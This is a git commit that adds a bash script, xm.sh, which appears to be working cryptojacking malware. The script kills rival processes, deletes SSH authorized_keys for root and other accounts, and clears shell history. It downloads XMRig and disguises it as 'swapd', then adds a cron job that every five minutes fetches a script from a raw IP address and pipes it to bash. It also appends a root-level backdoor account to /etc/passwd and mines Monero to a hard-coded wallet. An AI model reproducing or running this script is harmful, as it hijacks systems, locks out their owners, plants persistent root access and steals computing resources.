6b3453ea47b0d775a8b597ed7a582f14d4092cc8
Dann <77584658+nacht0141@users.noreply.github.com>
2021-03-24 11:24:55 +0700

    Add files via upload

---
+++ xm.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+pkill berlin
+rm -rf /root/.ssh/authorized_keys
+rm -rf /home/admin_sister/.ssh/authorized_keys
+rm -rf /home/sysadmin/.ssh/authorized_keys
+rm -rf /etc/beck
+rm -rf /etc/berlin
+history -c
+cd /tmp
+wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-x64.tar.gz -O /tmp/xm.tar.gz
+tar -xzvf xm.tar.gz
+mv /tmp/xmrig-6.8.2/xmrig /tmp/swapd
+rm -rf xmrig-6.8.2 xm.tar.gz
+#
+echo '*/5 * * * * if [ "swapd" == $"$(ps -A | grep -ow "swapd")" ] ; then echo "" ; else wget 103.101.3.74:5555/xm.sh -O- | bash ; fi' | crontab
+#
+if [ "k73/Pxl9JcZ8w" == "$(cat /etc/passwd | grep -o -m 1 "k73/Pxl9JcZ8w")" ] ;
+then
+printf "" ;
+else
+echo "systemd-user:k73/Pxl9JcZ8w:0:0::/root:/bin/bash" | tee -a /etc/passwd ;
+fi
+#
+history -c
+./swapd -o sg.minexmr.com:443 -u 45vCvNhSG41LKu2wZaH4bDPPKMjwBMpPWWNo6tiRkgznN47ybvPoYbRht8GeXZ6v691P6tukYnh3i412mUKmn3Ey1Za3vma -k --tls --rig-id "$(curl icanhazip.com | sed -r 's/[.]+/_/g')" &
